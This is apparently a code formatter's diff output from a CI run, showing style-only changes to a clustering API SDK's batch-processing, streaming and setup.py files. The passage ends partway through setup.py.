         self.total_batches = total_batches
         self.completed_batches = 0
         self.stats = BatchProcessingStats()
         self.lock = threading.Lock()
-        
+
     def update_progress(self, result: ProcessingResult, processing_time: float):
         """Update progress with a completed batch."""
         with self.lock:
             self.completed_batches += 1
             self.stats.successful_batches += 1
             self.stats.total_clusters += len(result.clusters)
             self.stats.total_outliers += len(result.outliers)
             self.stats.total_points += result.total_points
             self.stats.total_processing_time += processing_time
-            
+
             # Update quality (running average)
-            total_quality = (self.stats.average_quality * (self.stats.successful_batches - 1) + 
-                           result.algorithm_quality)
+            total_quality = (
+                self.stats.average_quality * (self.stats.successful_batches - 1)
+                + result.algorithm_quality
+            )
             self.stats.average_quality = total_quality / self.stats.successful_batches
-            
+
             self._display_progress()
-    
+
     def update_failure(self, error: Exception):
         """Update progress with a failed batch."""
         with self.lock:
             self.completed_batches += 1
             self.stats.failed_batches += 1
             self._display_progress()
             print(f"❌ Batch failed: {error}")
-    
+
     def _display_progress(self):
         """Display current progress."""
         percentage = (self.completed_batches / self.total_batches) * 100
-        
-        print(f"\r📊 Progress: {self.completed_batches}/{self.total_batches} "
-              f"({percentage:.1f}%) | "
-              f"Success: {self.stats.success_rate:.1%} | "
-              f"Points: {self.stats.total_points} | "
-              f"Clusters: {self.stats.total_clusters}", end='', flush=True)
-        
+
+        print(
+            f"\r📊 Progress: {self.completed_batches}/{self.total_batches} "
+            f"({percentage:.1f}%) | "
+            f"Success: {self.stats.success_rate:.1%} | "
+            f"Points: {self.stats.total_points} | "
+            f"Clusters: {self.stats.total_clusters}",
+            end="",
+            flush=True,
+        )
+
         if self.completed_batches == self.total_batches:
             print()  # New line when complete
+
 
 def example_synchronous_batch_processing():
     """Example 1: Synchronous batch processing with progress tracking."""
     print("\n📦 Example 1: Synchronous Batch Processing")
     print("-" * 50)
-    
+
     # Configuration
     total_points = 5000
     batch_size = 250
-    
+
     # Initialize components
     generator = LargeDatasetGenerator(num_clusters=4)
     batches = list(generator.generate_batches(total_points, batch_size))
     tracker = BatchProgressTracker(len(batches))
-    
-    print(f"🎯 Processing {total_points} points in {len(batches)} batches of {batch_size}")
-    
+
+    print(
+        f"🎯 Processing {total_points} points in {len(batches)} batches of {batch_size}"
+    )
+
     # Initialize client
     client = NCSClient(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key'),
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
         timeout=60.0,  # Longer timeout for large batches
-        max_retries=3
+        max_retries=3,
     )
-    
+
     tracker.stats.start_time = time.time()
-    
+
     try:
         # Process each batch
         for i, batch in enumerate(batches):
             try:
                 start_time = time.time()
                 result = client.process_points_batch(
-                    batch,
-                    batch_options={'timeout': 45}
+                    batch, batch_options={"timeout": 45}
                 )
                 processing_time = time.time() - start_time
-                
+
                 tracker.update_progress(result, processing_time)
-                
+
             except RateLimitError as e:
                 print(f"\n⏳ Rate limited, waiting {e.retry_after} seconds...")
                 time.sleep(e.retry_after)
-                
+
                 # Retry the batch
                 try:
                     start_time = time.time()
                     result = client.process_points_batch(batch)
                     processing_time = time.time() - start_time
                     tracker.update_progress(result, processing_time)
                 except Exception as retry_error:
                     tracker.update_failure(retry_error)
-            
+
             except Exception as e:
                 tracker.update_failure(e)
-    
+
     finally:
         tracker.stats.end_time = time.time()
         client.close()
-    
+
     # Display final results
     print(f"\n✅ Synchronous batch processing completed!")
     print_batch_statistics(tracker.stats)
+
 
 async def example_async_batch_processing():
     """Example 2: Asynchronous batch processing with concurrency control."""
     print("\n⚡ Example 2: Asynchronous Batch Processing")
     print("-" * 50)
-    
+
     # Configuration
     total_points = 8000
     batch_size = 400
     max_concurrent = 5  # Limit concurrent requests
-    
+
     # Initialize components
     generator = LargeDatasetGenerator(num_clusters=6)
     batches = list(generator.generate_batches(total_points, batch_size))
     tracker = BatchProgressTracker(len(batches))
-    
+
     print(f"🎯 Processing {total_points} points in {len(batches)} batches")
     print(f"⚡ Max concurrent requests: {max_concurrent}")
-    
+
     async with async_client_context(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key'),
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
         timeout=60.0,
-        max_connections=max_concurrent * 2
+        max_connections=max_concurrent * 2,
     ) as client:
-        
         # Semaphore to control concurrency
         semaphore = asyncio.Semaphore(max_concurrent)
-        
+
         async def process_batch_async(batch: List[List[float]], batch_id: int):
             """Process a single batch asynchronously."""
             async with semaphore:
                 try:
                     start_time = time.time()
                     result = await client.process_points(batch)
                     processing_time = time.time() - start_time
-                    
+
                     tracker.update_progress(result, processing_time)
                     return result
-                
+
                 except RateLimitError as e:
                     await asyncio.sleep(e.retry_after)
                     # Retry once
                     start_time = time.time()
                     result = await client.process_points(batch)
                     processing_time = time.time() - start_time
                     tracker.update_progress(result, processing_time)
                     return result
-                
+
                 except Exception as e:
                     tracker.update_failure(e)
                     return None
-        
+
         tracker.stats.start_time = time.time()
-        
+
         # Create tasks for all batches
-        tasks = [
-            process_batch_async(batch, i) 
-            for i, batch in enumerate(batches)
-        ]
-        
+        tasks = [process_batch_async(batch, i) for i, batch in enumerate(batches)]
+
         # Process all batches concurrently
         results = await asyncio.gather(*tasks, return_exceptions=True)
-        
+
         tracker.stats.end_time = time.time()
-        
+
         # Count successful results
         successful_results = [r for r in results if isinstance(r, ProcessingResult)]
-        
+
         print(f"\n✅ Async batch processing completed!")
         print(f"📊 Successful batches: {len(successful_results)}/{len(batches)}")
         print_batch_statistics(tracker.stats)
+
 
 def example_csv_file_processing():
     """Example 3: Processing data from CSV files."""
     print("\n📄 Example 3: CSV File Processing")
     print("-" * 50)
-    
+
     # Generate a sample CSV file
     csv_filename = "sample_dataset.csv"
     generator = LargeDatasetGenerator(num_clusters=3)
     generator.save_to_csv(csv_filename, 2000)
-    
-    def read_csv_in_batches(filename: str, batch_size: int) -> Iterator[List[List[float]]]:
+
+    def read_csv_in_batches(
+        filename: str, batch_size: int
+    ) -> Iterator[List[List[float]]]:
         """Read CSV file in batches."""
         batch = []
-        
-        with open(filename, 'r') as csvfile:
+
+        with open(filename, "r") as csvfile:
             reader = csv.DictReader(csvfile)
-            
+
             for row in reader:
                 try:
-                    point = [float(row['x']), float(row['y']), float(row['z'])]
+                    point = [float(row["x"]), float(row["y"]), float(row["z"])]
                     batch.append(point)
-                    
+
                     if len(batch) >= batch_size:
                         yield batch
                         batch = []
-                
+
                 except (ValueError, KeyError) as e:
                     print(f"⚠️  Skipping invalid row: {row} - {e}")
-            
+
             # Yield remaining points
             if batch:
                 yield batch
-    
+
     # Process CSV file
     batch_size = 300
     client = NCSClient(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key')
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
     )
-    
+
     print(f"📊 Processing CSV file '{csv_filename}' in batches of {batch_size}")
-    
+
     total_processed = 0
     total_clusters = 0
     processing_results = []
-    
+
     try:
         start_time = time.time()
-        
-        for batch_num, batch in enumerate(read_csv_in_batches(csv_filename, batch_size)):
+
+        for batch_num, batch in enumerate(
+            read_csv_in_batches(csv_filename, batch_size)
+        ):
             try:
                 result = client.process_points(batch)
                 total_processed += len(batch)
                 total_clusters += len(result.clusters)
                 processing_results.append(result)
-                
-                print(f"✅ Batch {batch_num + 1}: {len(batch)} points → "
-                      f"{len(result.clusters)} clusters (quality: {result.algorithm_quality:.3f})")
-            
+
+                print(
+                    f"✅ Batch {batch_num + 1}: {len(batch)} points → "
+                    f"{len(result.clusters)} clusters (quality: {result.algorithm_quality:.3f})"
+                )
+
             except Exception as e:
                 print(f"❌ Batch {batch_num + 1} failed: {e}")
-        
+
         elapsed_time = time.time() - start_time
-        
+
         print(f"\n📊 CSV Processing Results:")
         print(f"   Total points processed: {total_processed}")
         print(f"   Total clusters found: {total_clusters}")
         print(f"   Processing time: {elapsed_time:.2f} seconds")
         print(f"   Throughput: {total_processed / elapsed_time:.1f} points/sec")
-        
+
         if processing_results:
-            avg_quality = sum(r.algorithm_quality for r in processing_results) / len(processing_results)
+            avg_quality = sum(r.algorithm_quality for r in processing_results) / len(
+                processing_results
+            )
             print(f"   Average quality: {avg_quality:.3f}")
-    
+
     finally:
         client.close()
         # Clean up CSV file
         try:
             os.remove(csv_filename)
             print(f"🗑️  Cleaned up {csv_filename}")
         except OSError:
             pass
 
+
 async def example_memory_efficient_processing():
     """Example 4: Memory-efficient processing of very large datasets."""
     print("\n🧠 Example 4: Memory-Efficient Large Dataset Processing")
     print("-" * 50)
-    
+
     # Configuration for very large dataset
     total_points = 50000  # Large dataset
     batch_size = 500
     max_concurrent = 3  # Conservative concurrency for memory efficiency
-    
+
     print(f"🎯 Memory-efficient processing of {total_points} points")
     print(f"📦 Batch size: {batch_size}")
     print(f"⚡ Concurrency: {max_concurrent}")
-    
+
     async with async_client_context(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key')
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
     ) as client:
-        
         # Generator for memory efficiency (doesn't store all data in memory)
         def memory_efficient_generator():
             """Generate batches on-demand to save memory."""
             generator = LargeDatasetGenerator(num_clusters=8)
             remaining = total_points
-            
+
             while remaining > 0:
                 current_batch_size = min(batch_size, remaining)
                 yield generator.generate_points(current_batch_size)
                 remaining -= current_batch_size
-        
+
         # Process with controlled memory usage
         semaphore = asyncio.Semaphore(max_concurrent)
         stats = BatchProcessingStats()
         stats.start_time = time.time()
-        
+
         async def process_with_memory_control(batch: List[List[float]], batch_id: int):
             """Process batch with memory management."""
             async with semaphore:
                 try:
                     result = await client.process_points(batch)
-                    
+
                     # Update stats atomically
                     stats.successful_batches += 1
                     stats.total_points += len(batch)
                     stats.total_clusters += len(result.clusters)
-                    
+
                     # Memory-efficient: don't store full results
                     del batch  # Explicitly free memory
-                    
+
                     if batch_id % 10 == 0:  # Progress every 10 batches
-                        print(f"📊 Processed batch {batch_id + 1}: "
-                              f"{stats.total_points} points, "
-                              f"{stats.total_clusters} clusters")
-                    
+                        print(
+                            f"📊 Processed batch {batch_id + 1}: "
+                            f"{stats.total_points} points, "
+                            f"{stats.total_clusters} clusters"
+                        )
+
                     return True
-                
+
                 except Exception as e:
                     stats.failed_batches += 1
                     if batch_id % 20 == 0:  # Less frequent error reporting
                         print(f"❌ Batch {batch_id + 1} failed: {e}")
                     return False
-        
+
         # Process all batches
         tasks = []
         for batch_id, batch in enumerate(memory_efficient_generator()):
             task = process_with_memory_control(batch, batch_id)
             tasks.append(task)
-            
+
             # Process in chunks to control memory usage
             if len(tasks) >= max_concurrent * 2:
                 await asyncio.gather(*tasks)
                 tasks = []
-        
+
         # Process remaining tasks
         if tasks:
             await asyncio.gather(*tasks)
-        
+
         stats.end_time = time.time()
-        
+
         print(f"\n✅ Memory-efficient processing completed!")
         print(f"📊 Final Statistics:")
         print(f"   Total points: {stats.total_points}")
         print(f"   Successful batches: {stats.successful_batches}")
         print(f"   Failed batches: {stats.failed_batches}")
         print(f"   Success rate: {stats.success_rate:.1%}")
         print(f"   Total clusters: {stats.total_clusters}")
         print(f"   Processing time: {stats.elapsed_time:.2f} seconds")
         print(f"   Throughput: {stats.points_per_second:.1f} points/sec")
+
 
 def print_batch_statistics(stats: BatchProcessingStats):
     """Print detailed batch processing statistics."""
     print(f"\n📊 Batch Processing Statistics:")
     print(f"   Total points processed: {stats.total_points:,}")
@@ -492,50 +519,53 @@
     print(f"   Total clusters found: {stats.total_clusters}")
     print(f"   Total outliers: {stats.total_outliers}")
     print(f"   Average quality: {stats.average_quality:.3f}")
     print(f"   Total processing time: {stats.elapsed_time:.2f} seconds")
     print(f"   Throughput: {stats.points_per_second:.1f} points/second")
-    
+
     if stats.successful_batches > 0:
         avg_batch_time = stats.total_processing_time / stats.successful_batches
         print(f"   Average batch processing time: {avg_batch_time:.3f} seconds")
 
+
 async def main():
     """Main function running all batch processing examples."""
     configure_logging("INFO")
-    
+
     print("📦 NeuroCluster Streamer Python SDK - Batch Processing Examples")
     print("=" * 70)
-    
+
     try:
         # Run batch processing examples
         example_synchronous_batch_processing()
         await asyncio.sleep(1)
-        
+
         await example_async_batch_processing()
         await asyncio.sleep(1)
-        
+
         example_csv_file_processing()
         await asyncio.sleep(1)
-        
+
         await example_memory_efficient_processing()
-        
+
         print("\n🎉 All batch processing examples completed successfully!")
         print("\n💡 Key Takeaways:")
         print("   ✅ Async processing significantly improves throughput")
         print("   ✅ Concurrency control prevents overwhelming the API")
         print("   ✅ Memory-efficient patterns enable large dataset processing")
         print("   ✅ Error handling and retry logic ensure reliability")
         print("   ✅ Progress tracking helps monitor long-running operations")
-    
+
     except Exception as e:
         print(f"\n💥 Batch processing examples failed: {e}")
         import traceback
+
         traceback.print_exc()
+
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
         print("\n⏹️  Examples interrupted by user")
     except Exception as e:
-        print(f"\n💥 Examples failed with error: {e}")
\ No newline at end of file
+        print(f"\n💥 Examples failed with error: {e}")
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/batch_processing.py
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/streaming_example.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/streaming_example.py	2025-06-10 20:31:25.484857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/examples/streaming_example.py	2025-06-10 20:32:35.526159+00:00
@@ -26,388 +26,418 @@
 
 # Add the parent directory to path for development
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from ncs_client import (
-    AsyncNCSClient, async_client_context,
-    configure_logging, ProcessingResult, NCSError
+    AsyncNCSClient,
+    async_client_context,
+    configure_logging,
+    ProcessingResult,
+    NCSError,
 )
+
 
 class DataStreamSimulator:
     """Simulates a real-time data stream for demonstration."""
-    
+
     def __init__(self, points_per_second: int = 10):
         self.points_per_second = points_per_second
         self.running = False
-        self.cluster_centers = [
-            [0, 0, 0], [5, 5, 5], [10, 0, 10], [-5, 5, -5]
-        ]
-        
+        self.cluster_centers = [[0, 0, 0], [5, 5, 5], [10, 0, 10], [-5, 5, -5]]
+
     async def generate_stream(self):
         """Generate a continuous stream of data points."""
         self.running = True
-        
+
         while self.running:
             # Generate points around random cluster centers
             center = random.choice(self.cluster_centers)
             point = [
                 center[0] + random.gauss(0, 1.5),
                 center[1] + random.gauss(0, 1.5),
-                center[2] + random.gauss(0, 1.5)
+                center[2] + random.gauss(0, 1.5),
             ]
-            
+
             yield point
-            
+
             # Control the rate of point generation
             await asyncio.sleep(1.0 / self.points_per_second)
-    
+
     def stop(self):
         """Stop the data stream."""
         self.running = False
 
+
 class ClusterMonitor:
     """Monitors and displays cluster updates in real-time."""
-    
+
     def __init__(self):
         self.cluster_history = []
         self.total_points_processed = 0
         self.start_time = time.time()
-        
+
     async def on_cluster_update(self, result: ProcessingResult):
         """Handle cluster update events."""
         self.total_points_processed += result.total_points
         self.cluster_history.append(result)
-        
+
         # Display update
         elapsed = time.time() - self.start_time
         print(f"\n📊 Cluster Update at {elapsed:.1f}s:")
         print(f"   Clusters: {len(result.clusters)}")
         print(f"   Outliers: {len(result.outliers)}")
         print(f"   Quality: {result.algorithm_quality:.3f}")
         print(f"   Processing time: {result.processing_time_ms:.1f}ms")
         print(f"   Total processed: {self.total_points_processed}")
-        
+
         # Show cluster details
         for cluster in result.clusters:
-            print(f"      Cluster {cluster.id}: {cluster.size} points, "
-                  f"center=[{cluster.center[0]:.1f}, {cluster.center[1]:.1f}, {cluster.center[2]:.1f}]")
-    
+            print(
+                f"      Cluster {cluster.id}: {cluster.size} points, "
+                f"center=[{cluster.center[0]:.1f}, {cluster.center[1]:.1f}, {cluster.center[2]:.1f}]"
+            )
+
     def get_statistics(self) -> Dict[str, Any]:
         """Get processing statistics."""
         if not self.cluster_history:
             return {}
-        
+
         elapsed = time.time() - self.start_time
-        
+
         return {
             "total_updates": len(self.cluster_history),
             "total_points": self.total_points_processed,
             "elapsed_time": elapsed,
-            "points_per_second": self.total_points_processed / elapsed if elapsed > 0 else 0,
-            "average_clusters": sum(len(r.clusters) for r in self.cluster_history) / len(self.cluster_history),
-            "average_quality": sum(r.algorithm_quality for r in self.cluster_history) / len(self.cluster_history)
+            "points_per_second": self.total_points_processed / elapsed
+            if elapsed > 0
+            else 0,
+            "average_clusters": sum(len(r.clusters) for r in self.cluster_history)
+            / len(self.cluster_history),
+            "average_quality": sum(r.algorithm_quality for r in self.cluster_history)
+            / len(self.cluster_history),
         }
+
 
 async def example_basic_streaming():
     """Example 1: Basic streaming with WebSocket connection."""
     print("\n🌊 Example 1: Basic WebSocket Streaming")
     print("-" * 50)
-    
+
     async with async_client_context(
-        base_url=os.getenv('NCS_API_URL', 'wss://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key')
+        base_url=os.getenv("NCS_API_URL", "wss://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
     ) as client:
-        
         # Message handler for incoming cluster updates
         async def handle_stream_message(data: Dict[str, Any]):
-            if data.get('type') == 'cluster_update':
-                clusters = data.get('clusters', [])
+            if data.get("type") == "cluster_update":
+                clusters = data.get("clusters", [])
                 print(f"📡 Received cluster update: {len(clusters)} clusters")
-                
+
                 for cluster in clusters[:3]:  # Show first 3 clusters
                     print(f"   Cluster {cluster['id']}: {cluster['size']} points")
-        
+
         try:
             # Start streaming connection
             stream = await client.start_streaming(
-                on_message=handle_stream_message,
-                connection_id="basic_stream"
-            )
-            
+                on_message=handle_stream_message, connection_id="basic_stream"
+            )
+
             print("✅ Streaming connection established")
-            
+
             # Send some test points
             test_points = [
                 [1.0, 2.0, 3.0],
                 [1.1, 2.1, 3.1],
                 [5.0, 6.0, 7.0],
-                [5.1, 6.1, 7.1]
+                [5.1, 6.1, 7.1],
             ]
-            
+
             for i, point in enumerate(test_points):
                 await stream.send_point(point)
                 print(f"📤 Sent point {i+1}: {point}")
                 await asyncio.sleep(1)
-            
+
             # Wait for responses
             await asyncio.sleep(3)
-            
+
             # Stop streaming
             await client.stop_streaming("basic_stream")
             print("✅ Streaming connection closed")
-        
+
         except Exception as e:
             print(f"❌ Streaming error: {e}")
+
 
 async def example_concurrent_processing():
     """Example 2: Concurrent processing of multiple data streams."""
     print("\n⚡ Example 2: Concurrent Stream Processing")
     print("-" * 50)
-    
+
     async with async_client_context(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key'),
-        max_connections=10
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
+        max_connections=10,
     ) as client:
-        
         # Generate multiple batches of points concurrently
         def generate_batch(batch_id: int, size: int = 50) -> List[List[float]]:
             """Generate a batch of points around a specific area."""
             center = [batch_id * 3, batch_id * 3, 0]
             return [
                 [
                     center[0] + random.gauss(0, 1),
                     center[1] + random.gauss(0, 1),
-                    center[2] + random.gauss(0, 1)
+                    center[2] + random.gauss(0, 1),
                 ]
                 for _ in range(size)
             ]
-        
+
         # Create multiple batches
         batches = [generate_batch(i, 30) for i in range(5)]
-        
-        print(f"📦 Generated {len(batches)} batches with {sum(len(b) for b in batches)} total points")
-        
+
+        print(
+            f"📦 Generated {len(batches)} batches with {sum(len(b) for b in batches)} total points"
+        )
+
         try:
             # Process all batches concurrently
             start_time = time.time()
-            results = await client.process_points_concurrent(
-                batches, 
-                max_concurrent=3
-            )
+            results = await client.process_points_concurrent(batches, max_concurrent=3)
             processing_time = time.time() - start_time
-            
+
             print(f"✅ Concurrent processing completed in {processing_time:.2f} seconds")
             print(f"📊 Results summary:")
-            
+
             total_clusters = sum(len(result.clusters) for result in results)
             total_outliers = sum(len(result.outliers) for result in results)
-            avg_quality = sum(result.algorithm_quality for result in results) / len(results)
-            
+            avg_quality = sum(result.algorithm_quality for result in results) / len(
+                results
+            )
+
             print(f"   Total clusters: {total_clusters}")
             print(f"   Total outliers: {total_outliers}")
             print(f"   Average quality: {avg_quality:.3f}")
-            print(f"   Processing rate: {sum(len(b) for b in batches) / processing_time:.1f} points/sec")
-        
+            print(
+                f"   Processing rate: {sum(len(b) for b in batches) / processing_time:.1f} points/sec"
+            )
+
         except Exception as e:
             print(f"❌ Concurrent processing error: {e}")
+
 
 async def example_stream_processing():
     """Example 3: Real-time stream processing with monitoring."""
     print("\n📈 Example 3: Real-time Stream Processing")
     print("-" * 50)
-    
+
     # Initialize components
     simulator = DataStreamSimulator(points_per_second=5)
     monitor = ClusterMonitor()
-    
+
     async with async_client_context(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key')
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
     ) as client:
-        
         print("🚀 Starting real-time stream processing...")
-        
+
         # Stream processor function
         async def process_data_stream():
             """Process continuous data stream in batches."""
             batch = []
             batch_size = 10
-            
+
             async for point in simulator.generate_stream():
                 batch.append(point)
-                
+
                 if len(batch) >= batch_size:
                     try:
                         # Process the batch
                         result = await client.process_points(batch)
                         await monitor.on_cluster_update(result)
-                        
+
                         # Clear the batch
                         batch = []
-                        
+
                     except Exception as e:
                         print(f"❌ Processing error: {e}")
                         await asyncio.sleep(1)  # Brief pause on error
-        
+
         # Statistics reporter
         async def report_statistics():
             """Periodically report processing statistics."""
             while simulator.running:
                 await asyncio.sleep(10)  # Report every 10 seconds
-                
+
                 stats = monitor.get_statistics()
                 if stats:
                     print(f"\n📊 Processing Statistics:")
                     print(f"   Updates: {stats['total_updates']}")
                     print(f"   Points processed: {stats['total_points']}")
                     print(f"   Rate: {stats['points_per_second']:.1f} points/sec")
                     print(f"   Avg clusters: {stats['average_clusters']:.1f}")
                     print(f"   Avg quality: {stats['average_quality']:.3f}")
-        
+
         try:
             # Start processing and monitoring
             processing_task = asyncio.create_task(process_data_stream())
             stats_task = asyncio.create_task(report_statistics())
-            
+
             # Run for 30 seconds
             await asyncio.sleep(30)
-            
+
             # Stop the simulation
             simulator.stop()
-            
+
             # Wait for tasks to complete
             await processing_task
             stats_task.cancel()
-            
+
             # Final statistics
             final_stats = monitor.get_statistics()
             print(f"\n🎯 Final Statistics:")
-            print(f"   Total processing time: {final_stats['elapsed_time']:.1f} seconds")
+            print(
+                f"   Total processing time: {final_stats['elapsed_time']:.1f} seconds"
+            )
             print(f"   Total points: {final_stats['total_points']}")
-            print(f"   Average throughput: {final_stats['points_per_second']:.1f} points/sec")
+            print(
+                f"   Average throughput: {final_stats['points_per_second']:.1f} points/sec"
+            )
             print(f"   Total cluster updates: {final_stats['total_updates']}")
-            
+
         except Exception as e:
             print(f"❌ Stream processing error: {e}")
             simulator.stop()
+
 
 async def example_adaptive_batching():
     """Example 4: Adaptive batching based on processing performance."""
     print("\n🎛️  Example 4: Adaptive Batching")
     print("-" * 50)
-    
+
     async with async_client_context(
-        base_url=os.getenv('NCS_API_URL', 'https://demo.ncs-api.com'),
-        api_key=os.getenv('NCS_API_KEY', 'demo-key')
+        base_url=os.getenv("NCS_API_URL", "https://demo.ncs-api.com"),
+        api_key=os.getenv("NCS_API_KEY", "demo-key"),
     ) as client:
-        
         # Adaptive batch processor
         class AdaptiveBatchProcessor:
             def __init__(self):
                 self.batch_size = 20  # Start with moderate batch size
                 self.min_batch_size = 5
                 self.max_batch_size = 100
                 self.target_processing_time = 500  # Target 500ms processing time
                 self.performance_history = []
-            
+
             def adjust_batch_size(self, processing_time_ms: float):
                 """Adjust batch size based on processing performance."""
                 self.performance_history.append(processing_time_ms)
-                
+
                 # Keep only recent history
                 if len(self.performance_history) > 10:
                     self.performance_history = self.performance_history[-10:]
-                
+
                 avg_time = sum(self.performance_history) / len(self.performance_history)
-                
+
                 if avg_time > self.target_processing_time * 1.2:  # Too slow
-                    self.batch_size = max(self.min_batch_size, int(self.batch_size * 0.8))
-                    print(f"📉 Reducing batch size to {self.batch_size} (avg time: {avg_time:.1f}ms)")
-                
+                    self.batch_size = max(
+                        self.min_batch_size, int(self.batch_size * 0.8)
+                    )
+                    print(
+                        f"📉 Reducing batch size to {self.batch_size} (avg time: {avg_time:.1f}ms)"
+                    )
+
                 elif avg_time < self.target_processing_time * 0.8:  # Too fast
-                    self.batch_size = min(self.max_batch_size, int(self.batch_size * 1.2))
-                    print(f"📈 Increasing batch size to {self.batch_size} (avg time: {avg_time:.1f}ms)")
-        
+                    self.batch_size = min(
+                        self.max_batch_size, int(self.batch_size * 1.2)
+                    )
+                    print(
+                        f"📈 Increasing batch size to {self.batch_size} (avg time: {avg_time:.1f}ms)"
+                    )
+
         processor = AdaptiveBatchProcessor()
         total_processed = 0
-        
+
         # Generate data stream
         def generate_continuous_data():
             """Generate continuous stream of points."""
             while True:
                 center = random.choice([[0, 0, 0], [10, 10, 10], [-5, 5, 0]])
                 yield [
                     center[0] + random.gauss(0, 2),
                     center[1] + random.gauss(0, 2),
-                    center[2] + random.gauss(0, 2)
+                    center[2] + random.gauss(0, 2),
                 ]
-        
+
         data_stream = generate_continuous_data()
-        
+
         print("🔄 Starting adaptive batching demonstration...")
-        
+
         try:
             for iteration in range(15):  # Run 15 iterations
                 # Collect batch
                 batch = [next(data_stream) for _ in range(processor.batch_size)]
-                
+
                 # Process with timing
                 start_time = time.time()
                 result = await client.process_points(batch)
                 actual_time = (time.time() - start_time) * 1000  # Convert to ms
-                
+
                 total_processed += len(batch)
-                
+
                 print(f"📊 Iteration {iteration + 1}:")
                 print(f"   Batch size: {len(batch)}")
-                print(f"   Processing time: {actual_time:.1f}ms (server: {result.processing_time_ms:.1f}ms)")
+                print(
+                    f"   Processing time: {actual_time:.1f}ms (server: {result.processing_time_ms:.1f}ms)"
+                )
                 print(f"   Clusters found: {len(result.clusters)}")
                 print(f"   Quality: {result.algorithm_quality:.3f}")
-                
+
                 # Adjust batch size for next iteration
                 processor.adjust_batch_size(actual_time)
-                
+
                 await asyncio.sleep(0.5)  # Brief pause between iterations
-            
+
             print(f"\n✅ Adaptive batching completed:")
             print(f"   Total points processed: {total_processed}")
             print(f"   Final optimal batch size: {processor.batch_size}")
-            print(f"   Average processing time: {sum(processor.performance_history)/len(processor.performance_history):.1f}ms")
-        
+            print(
+                f"   Average processing time: {sum(processor.performance_history)/len(processor.performance_history):.1f}ms"
+            )
+
         except Exception as e:
             print(f"❌ Adaptive batching error: {e}")
+
 
 async def main():
     """Main async function running all streaming examples."""
     configure_logging("INFO")
-    
+
     print("🌊 NeuroCluster Streamer Python SDK - Streaming Examples")
     print("=" * 65)
-    
+
     try:
         # Run streaming examples
         await example_basic_streaming()
         await asyncio.sleep(2)
-        
+
         await example_concurrent_processing()
         await asyncio.sleep(2)
-        
+
         await example_stream_processing()
         await asyncio.sleep(2)
-        
+
         await example_adaptive_batching()
-        
+
         print("\n🎉 All streaming examples completed successfully!")
-    
+
     except Exception as e:
         print(f"\n💥 Streaming examples failed: {e}")
         import traceback
+
         traceback.print_exc()
+
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
         print("\n⏹️  Examples interrupted by user")
     except Exception as e:
-        print(f"\n💥 Examples failed with error: {e}")
\ No newline at end of file
+        print(f"\n💥 Examples failed with error: {e}")
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/setup.py	2025-06-10 20:31:25.484857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/setup.py	2025-06-10 20:32:35.620491+00:00
@@ -10,198 +10,187 @@
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/setup.py
 
 from setuptools import setup, find_packages
 import os
 import re
 
+
 # Read version from __init__.py
 def get_version():
-    version_file = os.path.join(os.path.dirname(__file__), 'ncs_client', '__init__.py')
-    with open(version_file, 'r', encoding='utf-8') as f:
+    version_file = os.path.join(os.path.dirname(__file__), "ncs_client", "__init__.py")
+    with open(version_file, "r", encoding="utf-8") as f:
         version_match = re.search(r"^__version__ = ['\"]([^'\"]*)['\"]", f.read(), re.M)
         if version_match:
             return version_match.group(1)
     raise RuntimeError("Unable to find version string.")
 
+
 # Read long description from README
 def get_long_description():
-    readme_path = os.path.join(os.path.dirname(__file__), 'README.md')
+    readme_path = os.path.join(os.path.dirname(__file__), "README.md")
     if os.path.exists(readme_path):
-        with open(readme_path, 'r', encoding='utf-8') as f:
+        with open(readme_path, "r", encoding="utf-8") as f:
             return f.read()
     return "Official Python client library for the NeuroCluster Streamer API"
 
+
 # Read requirements from requirements.txt
-def get_requirements(filename='requirements.txt'):
+def get_requirements(filename="requirements.txt"):
     requirements_path = os.path.join(os.path.dirname(__file__), filename)
     if os.path.exists(requirements_path):
-        with open(requirements_path, 'r', encoding='utf-8') as f:
-            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        with open(requirements_path, "r", encoding="utf-8") as f:
+            return [
+                line.strip() for line in f if line.strip() and not line.startswith("#")
+            ]
     return []
+
 
 setup(
     # Package metadata
     name="ncs-python-sdk",
     version=get_version(),
